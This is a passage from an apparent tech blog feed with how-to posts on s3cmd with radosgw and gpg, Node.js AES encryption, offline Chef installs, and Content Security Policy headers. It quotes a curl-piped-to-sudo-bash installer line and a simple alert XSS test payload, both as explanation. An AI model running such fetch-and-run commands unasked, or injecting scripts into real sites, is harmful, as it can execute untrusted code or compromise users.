When using secure HTTPS protocol all communication with Amazon S3
servers is protected from 3rd party eavesdropping. This method is
slower than plain HTTP and can&amp;#39;t be used if you&amp;#39;re behind a proxy
Use HTTPS protocol [No]: yes

New settings:
  Access Key: key
  Secret Key: secret
  Encryption password: 
  Path to GPG program: /usr/local/bin/gpg
  Use HTTPS protocol: True
  HTTP Proxy server name: 
  HTTP Proxy server port: 0

Test access with supplied credentials? [Y/n] n

Save settings? [y/N] y
Configuration saved to &amp;#39;s3test.cfg&amp;#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The generated configuration file will look similar to:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-code&quot;&gt;[default]
access_key = abc
bucket_location = US
cloudfront_host = cloudfront.amazonaws.com
cloudfront_resource = /2010-07-15/distribution
default_mime_type = binary/octet-stream
delete_removed = False
dry_run = False
encoding = UTF-8
encrypt = False
follow_symlinks = False
force = False
get_continue = False
gpg_command = /usr/local/bin/gpg
gpg_decrypt = %(gpg_command)s -d --verbose --no-use-agent --batch --yes --passphrase-fd %(passphrase_fd)s -o %(output_file)s %(input_file)s
gpg_encrypt = %(gpg_command)s -c --verbose --no-use-agent --batch --yes --passphrase-fd %(passphrase_fd)s -o %(output_file)s %(input_file)s
gpg_passphrase =
guess_mime_type = True
host_base = s3.amazonaws.com
host_bucket = %(bucket)s.s3.amazonaws.com
human_readable_sizes = False
list_md5 = False
log_target_prefix =
preserve_attrs = True
progress_meter = True
proxy_host =
proxy_port = 0
recursive = False
recv_chunk = 4096
reduced_redundancy = False
secret_key = secret
send_chunk = 4096
simpledb_host = sdb.amazonaws.com
skip_existing = False
socket_timeout = 300
urlencoding_mode = normal
use_https = True
verbosity = WARNING
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Afterwards you may try to access your bucket with &lt;code&gt;s3cmd&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;s3cmd -c s3test.cfg ls
ERROR: S3 error: 403 (InvalidAccessKeyId): The AWS Access Key Id you provided does not exist &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; our records.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We need to adapt a few lines to configure s3cmd for radosgw. Currently &lt;code&gt;s3cmd&lt;/code&gt; does not know the radosgw hostname. Replace &lt;code&gt;host_base&lt;/code&gt; and &lt;code&gt;host_bucket&lt;/code&gt; with the hostname of the radosgw host:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-code&quot;&gt;host_base = s3.amazonaws.com
host_bucket = %(bucket)s.s3.amazonaws.com
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;becomes:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-code&quot;&gt;host_base = radosgw.example.com
host_bucket = %(bucket)s.radosgw.example.com
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now you should be able to run &lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-code&quot;&gt;s3cmd -c s3test.cfg ls
2014-09-06 12:05  s3://YOURBUCKET
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Sidenote: I had a few issues using lowercase bucket names with &lt;code&gt;radosgw&lt;/code&gt;. Uppercase buckets worked like a charm. &lt;/p&gt;
&lt;h2 id=&quot;encryption-with-gpg&quot;&gt;Encryption with gpg&lt;/h2&gt;
&lt;p&gt;If we talk about backups, we never want to store them unencrypted. &lt;code&gt;s3cmd&lt;/code&gt; supports &lt;a href=&quot;https://www.gnupg.org/&quot;&gt;gpg&lt;/a&gt;. The cool thing of using s3cmd in conjunction with gpg is the fact that it works completely transparent. Once configured, all files are automatically encrypted during upload and decrypted whenever you download a file.&lt;/p&gt;
&lt;p&gt;To activate encryption change the &lt;code&gt;s3cmd&lt;/code&gt; configuration file:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-code&quot;&gt;encrypt = True
gpg_command = gpg
gpg_decrypt = %(gpg_command)s -d --verbose --no-use-agent --batch --yes --passphrase-fd %(passphrase_fd)s -o %(output_file)s %(input_file)s
gpg_encrypt = %(gpg_command)s -c --cipher-algo AES256 --force-mdc --verbose --no-use-agent --batch --yes --passphrase-fd %(passphrase_fd)s -o %(output_file)s %(input_file)s
gpg_passphrase = longsecurepassphrase
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;At first you have to enable encryption with &lt;code&gt;encrypt = True&lt;/code&gt;. Although the default configuration uses &lt;code&gt;gpg_command = /usr/local/bin/gpg&lt;/code&gt;, I prefer to use &lt;code&gt;gpg_command = gpg&lt;/code&gt;. Now, you have to set &lt;code&gt;gpg&lt;/code&gt; in your system path, but on the other hand, the configuration works on Linux and Mac without any change. Additionally you want to ensure that gpg uses the right cipher. I prefer to set the cipher explicitly: &lt;code&gt;--cipher-algo AES256&lt;/code&gt;. Although default with AES256, the option &lt;code&gt;--force-mdc&lt;/code&gt; forces the use of encryption with a modification detection code.&lt;/p&gt;
&lt;p&gt;Finally, &lt;code&gt;s3cmd&lt;/code&gt; works with &lt;code&gt;radosgw&lt;/code&gt; and encryption.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$&amp;gt; cat &amp;gt; test.txt
samplecontent
$&amp;gt; s3cmd put test.txt s3://YOURBUCKET
test.txt -&amp;gt; s3://YOURBUCKET/test.txt  [1 of 1]
 4 of 4   100% in    0s     7.51 B/s  done
$&amp;gt; s3cmd get s3://YOURBUCKET/test.txt test2.txt
s3://YOURBUCKET/test.txt -&amp;gt; test2.txt  [1 of 1]
 4 of 4   100% in    0s     5.74 B/s  done
$&amp;gt; s3cmd del s3://YOURBUCKET/test.txt
File s3://YOURBUCKET/test.txt deleted
$&amp;gt; cat test2.txt 
samplecontent
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you have any questions contact me via &lt;a href=&quot;https://twitter.com/chri_hartmann&quot;&gt;Twitter @chri_hartmann&lt;/a&gt; or &lt;a href=&quot;https://github.com/chris-rock&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Encrypt and decrypt content with Nodejs</title>
      <link>http://lollyrock.com/articles/nodejs-encryption/</link>
      <pubDate>Mon, 01 Sep 2014 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/nodejs-encryption/</guid>
      <author></author>
      <description>&lt;style type=&quot;text/css&quot;&gt;
.gist {
  font-size: 12px;
}
&lt;/style&gt;

&lt;p&gt;Nodejs offers great support for cryptography. Under the hood it uses openssl and ships with a &lt;a href=&quot;http://nodejs.org/api/crypto.html&quot;&gt;Javascript api&lt;/a&gt;. Unfortunately the api is not always as intuitive as it should be, especially when you have to deal with error codes. To make you life easier, I collected various approaches for encryption with AES 256.&lt;/p&gt;
&lt;p&gt;Update: All examples are available on Github &lt;a href=&quot;https://github.com/chris-rock/node-crypto-examples&quot;&gt;node-crypto-examples&lt;/a&gt;, too.&lt;/p&gt;
&lt;h2 id=&quot;encryption-mode&quot;&gt;Encryption mode&lt;/h2&gt;
&lt;p&gt;The first decision is the AES encryption mode. Currently I recommend the &lt;a href=&quot;http://nodejs.org/api/crypto.html&quot;&gt;CTR mode&lt;/a&gt;. You may want to read &lt;a href=&quot;http://www.cs.ucdavis.edu/~rogaway/papers/modes.pdf&quot;&gt;Evaluation of Some Blockcipher Modes of Operation&lt;/a&gt; or &lt;a href=&quot;http://csrc.nist.gov/groups/ST/toolkit/BCM/documents/ccm-ad1.pdf&quot;&gt;On the Security of CTR + CBC-MAC&lt;/a&gt;. The next nodejs version comes with support for &lt;a href=&quot;http://en.wikipedia.org/wiki/Galois/Counter_Mode&quot;&gt;GCM&lt;/a&gt; to do &lt;a href=&quot;http://en.wikipedia.org/wiki/Authenticated_encryption&quot;&gt;authenticated encryption&lt;/a&gt;. Until then you have to use approaches like Encrypt-then-MAC and combine the encryption with the generation of &lt;a href=&quot;/articles/nodejs-sha512/&quot;&gt;SHA hashs&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;examples&quot;&gt;Examples&lt;/h2&gt;
&lt;h3 id=&quot;encrypt-and-decrypt-text&quot;&gt;Encrypt and decrypt text&lt;/h3&gt;
&lt;script src=&quot;https://gist.github.com/chris-rock/993d8a22c7138d1f0d2e.js&quot;&gt;&lt;/script&gt;

&lt;h3 id=&quot;encrypt-and-decrypt-buffers&quot;&gt;Encrypt and decrypt buffers&lt;/h3&gt;
&lt;script src=&quot;https://gist.github.com/chris-rock/6cac4e422f29c28c9d88.js&quot;&gt;&lt;/script&gt;

&lt;h3 id=&quot;encrypt-and-decrypt-streams&quot;&gt;Encrypt and decrypt streams&lt;/h3&gt;
&lt;script src=&quot;https://gist.github.com/chris-rock/335f92742b497256982a.js&quot;&gt;&lt;/script&gt;

&lt;h3 id=&quot;use-gcm-for-authenticated-encryption&quot;&gt;Use GCM for authenticated encryption&lt;/h3&gt;
&lt;p&gt;If you replace &lt;code&gt;aes-256-ctr&lt;/code&gt; with &lt;code&gt;aes-256-gcm&lt;/code&gt; you may think everything works as expected. Unfortunately this will result with a confusing error message: &lt;code&gt;TypeError: error:00000000:lib(0):func(0):reason(0)&lt;/code&gt;. &lt;/p&gt;
&lt;p&gt;Authenticated encryption includes a hash of the encrypted content and helps you to identify manipulated encrypted content.&lt;/p&gt;
&lt;p&gt;You need to set the &lt;a href=&quot;https://github.com/joyent/node/blob/857975d5e7e0d7bf38577db0478d9e5ede79922e/lib/crypto.js#L238-L245&quot;&gt;authentication tag&lt;/a&gt; via &lt;code&gt;decrypt.setAuthTag()&lt;/code&gt;, which is currently only available if you use &lt;code&gt;crypto.createCipheriv(algorithm, key, iv)&lt;/code&gt; with an &lt;a href=&quot;http://en.wikipedia.org/wiki/Initialization_vector&quot;&gt;initialization vector&lt;/a&gt;. GCM’s security is dependent on choosing a unique initialization vector for each encryption.&lt;/p&gt;
&lt;script src=&quot;https://gist.github.com/chris-rock/fe87dd35d6168512a2f7.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;The new GCM mode is available in nodejs 0.11. Try it with &lt;a href=&quot;https://github.com/visionmedia/n&quot;&gt;n&lt;/a&gt; via&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;npm install -g n
sudo n 0.11.13
n use 0.11.13 crypto-gcm.js
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Also take a look at the &lt;a href=&quot;https://github.com/joyent/node/blob/master/test/simple/test-crypto-authenticated.js#L44-L64&quot;&gt;nodejs tests&lt;/a&gt; for more tests with different setups.&lt;/p&gt;
&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;I hope the samples help you to get started with nodejs encryption.&lt;/p&gt;
&lt;p&gt;If you have any questions contact me via &lt;a href=&quot;https://twitter.com/chri_hartmann&quot;&gt;Twitter @chri_hartmann&lt;/a&gt; or &lt;a href=&quot;https://github.com/chris-rock&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;See also:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://lollyrock.com/articles/nodejs-sha512/&quot;&gt;SHA 512 Hashs with nodejs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://lollyrock.com/articles/express4-file-upload/&quot;&gt;Simple file uploads with Express 4&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://lollyrock.com/articles/content-security-policy/&quot;&gt;Applied Content Security Policy for Nginx and Nodejs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://arlimus.github.io/articles/ready.for.es6/&quot;&gt;Ready for ES6?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>Chef without an internet connection / Uninstall Chef with Chef</title>
      <link>http://lollyrock.com/articles/chef-without-internet/</link>
      <pubDate>Sat, 23  Aug 2014 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/chef-without-internet/</guid>
      <author></author>
      <description>&lt;p&gt;Recently I had a discussion with a DevOps team about an installation of Chef without an internet connection. A normal chef bootstrap fetches the chef binaries via “curl -L &lt;a href=&quot;https://www.opscode.com/chef/install.sh&quot;&gt;https://www.opscode.com/chef/install.sh&lt;/a&gt; | sudo bash”. This will happen, even if you use a Chef Server. Therefore you would require a connection to download the Chef client binaries. &lt;/p&gt;
&lt;p&gt;This blog post demonstrates a chef run without an internet connection. Be aware, that we proof the basic setup only. Cookbooks may depend on external urls, but most of them allow attribute overrides to set custom urls.&lt;/p&gt;
&lt;h2 id=&quot;install-chef-without-internet&quot;&gt;Install Chef without internet&lt;/h2&gt;
&lt;p&gt;Depending on your operating system, &lt;a href=&quot;http://www.getchef.com/chef/install/&quot;&gt;Chef provides multiple platform dependent installer&lt;/a&gt;. E.g. for Ubuntu you could go with:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;wget https://opscode-omnibus-packages.s3.amazonaws.com/ubuntu/13.04/x86_64/chef_11.12.8-2_amd64.deb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This enables you to store the binaries on a local server within your internal network. Now, you need to transfer the package on a fresh system and you can install it:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;
&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;---&amp;gt; Chef install status:&quot;&lt;/span&gt;
dpkg-query &lt;span class=&quot;_&quot;&gt;-l&lt;/span&gt; chef

&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;---&amp;gt; Install Chef&quot;&lt;/span&gt;
dpkg -i chef_11.12.8-2_amd64.deb

&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;---&amp;gt; Chef install status:&quot;&lt;/span&gt;
dpkg-query &lt;span class=&quot;_&quot;&gt;-l&lt;/span&gt; chef

&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;---&amp;gt; Start chef run&quot;&lt;/span&gt;
&lt;span class=&quot;comment&quot;&gt;# we use chef zero here (-z), if you use a chef server, this would work, too&lt;/span&gt;
chef-client -z -o chef-purge

&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;---&amp;gt; Chef install status:&quot;&lt;/span&gt;
dpkg-query &lt;span class=&quot;_&quot;&gt;-l&lt;/span&gt; chef
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This proofs that we are able to bootstrap a machine with a local chef binary. It would be amazing, if Chef Inc could provide apt and yum repositories. This would allow us to work with the standard operating system setup and we would be able to re-use existing package mirrors.&lt;/p&gt;
&lt;h1 id=&quot;uninstall-chef-with-chef&quot;&gt;Uninstall Chef with Chef&lt;/h1&gt;
&lt;p&gt;My customers often asked for a method to do a one-time install of &lt;a href=&quot;http://dev-sec.io/&quot;&gt;DevSec Hardening Framework&lt;/a&gt;. In such a case it would be great, if we could remove the chef installer after the machine bootstrap.&lt;/p&gt;
&lt;p&gt;Now fun begins and we proof, that we are able to uninstall the chef binary with a chef cookbook:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-ruby&quot;&gt;
&lt;span class=&quot;comment&quot;&gt;## Uninstall chef&lt;/span&gt;
package &lt;span class=&quot;string&quot;&gt;&quot;chef&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt;
  action &lt;span class=&quot;symbol&quot;&gt;:purge&lt;/span&gt;
&lt;span class=&quot;keyword&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The console output looks like:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;19:11:34 ∅&amp;gt; vagrant up
Bringing machine &lt;span class=&quot;string&quot;&gt;'core'&lt;/span&gt; up with &lt;span class=&quot;string&quot;&gt;'virtualbox'&lt;/span&gt; provider...
[core] VirtualBox VM is already running.
19:12:11 ∅&amp;gt; vagrant provision
[core] Running provisioner: shell...
[core] Running: inline script
---&amp;gt; Chef install status:
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig&lt;span class=&quot;_&quot;&gt;-a&lt;/span&gt;Wait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                             Version                           Description
+++-================================-=================================-==============================================================================
un  chef                             &amp;lt;none&amp;gt;                            (no description available)
Selecting previously unselected package chef.
(Reading database ... 61149 files and directories currently installed.)
Unpacking chef (from .../chef_11.12.8-2_amd64.deb) ...
Setting up chef (11.12.8-2) ...
Thank you &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; installing Chef!
---&amp;gt; Chef install status:
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig&lt;span class=&quot;_&quot;&gt;-a&lt;/span&gt;Wait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                             Version                           Description
+++-================================-=================================-==============================================================================
ii  chef                             11.12.8-2                         The full stack of chef
---&amp;gt; Start chef run
[2014-07-14T17:12:31+00:00] WARN: No config file found or specified on &lt;span class=&quot;built_in&quot;&gt;command&lt;/span&gt; line, using &lt;span class=&quot;built_in&quot;&gt;command&lt;/span&gt; line options.
[2014-07-14T17:12:31+00:00] INFO: Auto-discovered chef repository at /vagrant
[2014-07-14T17:12:31+00:00] INFO: Starting chef-zero on port 8889 with repository at repository at /vagrant
  One version per cookbook

[2014-07-14T17:12:31+00:00] INFO: Forking chef instance to converge...
[2014-07-14T17:12:31+00:00] WARN: 
* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
SSL validation of HTTPS requests is disabled. HTTPS connections are still
encrypted, but chef is not able to detect forged replies or man &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; the middle
attacks.

To fix this issue add an entry like this to your configuration file:

``
  &lt;span class=&quot;comment&quot;&gt;# Verify all HTTPS connections (recommended)&lt;/span&gt;
  ssl_verify_mode :verify_peer

  &lt;span class=&quot;comment&quot;&gt;# OR, Verify only connections to chef-server&lt;/span&gt;
  verify_api_cert &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;
``

To check your SSL configuration, or troubleshoot errors, you can use the
`knife ssl check` &lt;span class=&quot;built_in&quot;&gt;command&lt;/span&gt; like so:

``
  knife ssl check -c 
``

* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 

[2014-07-14T17:12:31+00:00] INFO: *** Chef 11.12.8 ***
[2014-07-14T17:12:31+00:00] INFO: Chef-client pid: 3311
[2014-07-14T17:12:33+00:00] WARN: Run List override has been provided.
[2014-07-14T17:12:33+00:00] WARN: Original Run List: []
[2014-07-14T17:12:33+00:00] WARN: Overridden Run List: [recipe[chef-purge]]
[2014-07-14T17:12:33+00:00] INFO: Run List is [recipe[chef-purge]]
[2014-07-14T17:12:33+00:00] INFO: Run List expands to [chef-purge]
[2014-07-14T17:12:33+00:00] INFO: Starting Chef Run &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; vagrant-ubuntu-precise-64
[2014-07-14T17:12:33+00:00] INFO: Running start handlers
[2014-07-14T17:12:33+00:00] INFO: Start handlers complete.
[2014-07-14T17:12:33+00:00] INFO: HTTP Request Returned 404 Not Found : Object not found: /reports/nodes/vagrant-ubuntu-precise-64/runs
[2014-07-14T17:12:33+00:00] INFO: Loading cookbooks [chef-purge@0.1.0]
[2014-07-14T17:12:33+00:00] INFO: Processing file[/root/x.txt] action create (chef-purge::default line 1)
[2014-07-14T17:12:33+00:00] INFO: Processing package[chef] action purge (chef-purge::default line 6)
[2014-07-14T17:12:35+00:00] INFO: package[chef] purged
[2014-07-14T17:12:35+00:00] WARN: Skipping final node save because override_runlist was given
[2014-07-14T17:12:35+00:00] INFO: Chef Run complete &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; 1.445303952 seconds
[2014-07-14T17:12:35+00:00] INFO: Running report handlers
[2014-07-14T17:12:35+00:00] INFO: Report handlers complete
---&amp;gt; Chef install status:
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig&lt;span class=&quot;_&quot;&gt;-a&lt;/span&gt;Wait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                             Version                           Description
+++-================================-=================================-==============================================================================
un  chef                             &amp;lt;none&amp;gt;                            (no description available)
19:12:40 ∅&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;It is possible to install the Chef client without an internet connection, but unfortunately Chef is not available via normal package systems like apt and yum. &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Chef binaries can be un-installed with a Chef run&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The full demo is available at &lt;a href=&quot;https://github.com/chris-rock/chef-purge-demo/&quot;&gt;Github&lt;/a&gt;. Do you have better approaches for running Chef runs without internet?&lt;/p&gt;
&lt;p&gt;If you have any questions contact me via &lt;a href=&quot;https://twitter.com/chri_hartmann&quot;&gt;Twitter @chri_hartmann&lt;/a&gt; or &lt;a href=&quot;https://github.com/chris-rock&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Applied Content Security Policy for Nginx and Nodejs</title>
      <link>http://lollyrock.com/articles/content-security-policy/</link>
      <pubDate>Sun, 17  Aug 2014 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/content-security-policy/</guid>
      <author></author>
      <description>&lt;p&gt;Some years ago it was common that users deactivated JavaScript to reduce the security risk of their browser. Nowadays HTML5 (JavaScript, CSS in combination with AJAX) is required to provide superior user experience. Users have no chance to deactivate JavaScript and expect the same kind of quality. Web Developers (and I am for sure part of it) on the other hand just add a simple &lt;code&gt;noscript&lt;/code&gt; and think they are done. In most cases Web Developers live with the credo: “JavaScript is essential. There is no web without.”&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-html&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;noscript&lt;/span&gt;&amp;gt;&lt;/span&gt;
    My Website does not support browsers without JavaScript disabled. 
    We promise we'll behave.
&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;noscript&lt;/span&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Do not get me wrong. I love JavaScript, but I care about security, too. This simple requirement defined by the web developer changes one fact: &lt;/p&gt;
&lt;p&gt;&lt;em&gt;Now, the web developer is responsible for the security of his JavaScript.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Yes, he may behave. But what happens if the users do not behave? Just take a look at &lt;a href=&quot;https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet&quot;&gt;XSS Filter Evasion Cheat Sheet&lt;/a&gt;. In most cases some inline script is enough to try cross-site scripting attacks:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-html&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;SCRIPT&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;actionscript&quot;&gt;alert(&lt;span class=&quot;string&quot;&gt;&quot;XSS&quot;&lt;/span&gt;);&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;SCRIPT&lt;/span&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The web developer is responsible to ensure, that all data is parsed and hardened against scripting attacks. Are you doing this? In most cases this sounds easier than thought. Do you check every input field? Even on client-side web apps? Are you sure?&lt;/p&gt;
&lt;p&gt;To sum it up:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;We need JavaScript activated&lt;/li&gt;
&lt;li&gt;User needs to trust the web developers&lt;/li&gt;
&lt;li&gt;Web Developer is responsible to ensure the security for his users&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
&lt;p&gt;Luckily there exists a solution that helps web developers to increase the security level of his web page: the HTTP &lt;code&gt;Content Security Policy&lt;/code&gt; header. And it is already supported by &lt;a href=&quot;http://caniuse.com/#feat=contentsecuritypolicy&quot;&gt;64% of the browsers&lt;/a&gt; and counting. &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;What is Content Security Policy (CSP)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In general CSP is a white-list of sources that you trust as a web developer. Trust &lt;code&gt;Google Analytics&lt;/code&gt;? Then you add it to your white-list. Trust &lt;code&gt;Facebook&lt;/code&gt;? Add it to your white-list. Trust &lt;code&gt;https://evil.example.com&lt;/code&gt;? For sure not. Just do not add it to your white-list. Sounds not to complicated right? A more in-depth description is available at &lt;a href=&quot;http://www.html5rocks.com/en/tutorials/security/content-security-policy/&quot;&gt;HTML5 Rocks&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;Following, I am going to focus on the practical setup of CSP. For example, you may require fonts and images with data URLs. Those are quite common and need to be separately activated. &lt;/p&gt;
&lt;p&gt;Activate images with data urls:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;img-src &amp;#39;self&amp;#39; data:;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The same applies for fonts:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;font-src &amp;#39;self&amp;#39; data:;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Some JavaScripts frameworks depend a lot on inline css. If you require it (but please test without): &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;style-src &amp;#39;self&amp;#39; &amp;#39;unsafe-inline&amp;#39;;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you are using cross-domain AJAX requests you need to to add the domain to the white-list, eg. for Google Analytics. Be aware that you still need to implement CORS or JSONP to retrieve the data properly.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;connect-src &amp;#39;self&amp;#39; https://apis.google.com;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Under all circumstances never ever, really, do not activate inline-scripts &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# don&amp;#39;t do this
script-src &amp;#39;self&amp;#39; &amp;#39;unsafe-inline&amp;#39;;
# don&amp;#39;t do this
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Your code may require some changes and it takes some extra effort to create a JavaScript file even for simple code snippets. This extra effort drastically improves the security of your web page.&lt;/p&gt;
&lt;p&gt;The following section shows configuration examples of &lt;code&gt;Content Security Policy&lt;/code&gt; for Nginx and Nodejs. The same approach can be applied to other languages or web servers.&lt;/p&gt;
&lt;h3 id=&quot;nginx&quot;&gt;Nginx&lt;/h3&gt;
&lt;p&gt;If your are using Nginx, a simple one-liner is enough to add &lt;code&gt;Content Security Policy&lt;/code&gt;. Be aware that you need to test all edges of your web application after you activated this header. &lt;/p&gt;
&lt;p&gt;After the activation, the browser does not execute or display any content that is not allowed and this may break your web page.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Attention: Caching applies here to. At least Chrome uses a quite aggressive caching strategy for the CSP header. A simple page reload may not be enough to change the browser behavior.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;A general good idea is to deactivate a much as possible and try to work out all issues. After you tried hard to fix all issues, start to relax the white-list. I’d like to repeat myself: &lt;em&gt;Under no circumstances activate Inline-JavaScript&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;A practical Nginx setup could look like:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-json&quot;&gt;server {
    listen 80;
    listen [::]:80 default_server ipv6only=on;

    location / {

        # you can tell the browser that it can only download content from the domains you explicitly allow
        add_header Content-Security-Policy &amp;quot;default-src &amp;#39;self&amp;#39;; script-src &amp;#39;self&amp;#39;; img-src &amp;#39;self&amp;#39; data:; style-src &amp;#39;self&amp;#39; &amp;#39;unsafe-inline&amp;#39;; font-src &amp;#39;self&amp;#39; data:; frame-src &amp;#39;self&amp;#39;; connect-src &amp;#39;self&amp;#39; https://apis.google.com; object-src &amp;#39;none&amp;#39; &amp;quot;;

        ...
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;nodejs&quot;&gt;Nodejs&lt;/h3&gt;
&lt;p&gt;I’ll take Nodejs as an example for a web application, but the same can be applied to Ruby, Python, Scala etc.&lt;/p&gt;
&lt;p&gt;In general I see four possibilities for Content Security Policy:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The web application is delivered with CSP already&lt;/li&gt;
&lt;li&gt;You use the web application behind a proxy&lt;/li&gt;
&lt;li&gt;Add the CSP header to your web framework like express&lt;/li&gt;
&lt;li&gt;Use a convenience library like helmet in Nodejs&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;If your applications falls under possibility #1, verify the white-list and get some cup of coffee. The #2 possibility can be easily implemented with the Nginx approach mentioned above.&lt;/p&gt;
&lt;p&gt;Now we deal with #3:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var express = require(&amp;#39;express&amp;#39;);
var app = express();

app.get(&amp;#39;/&amp;#39;, function(req, res){
